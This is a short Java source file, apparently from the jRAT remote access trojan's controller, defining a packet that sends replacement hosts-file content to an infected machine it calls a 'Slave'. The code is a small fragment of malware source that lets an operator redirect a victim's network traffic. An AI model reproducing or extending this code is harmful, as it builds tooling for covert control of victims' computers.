package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet56UpdateHostsFile extends AbstractOutgoingPacket {

	private String content;

	public Packet56UpdateHostsFile(String content) {
		this.content = content;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(content);
	}

	@Override
	public short getPacketId() {
		return 56;
	}

}
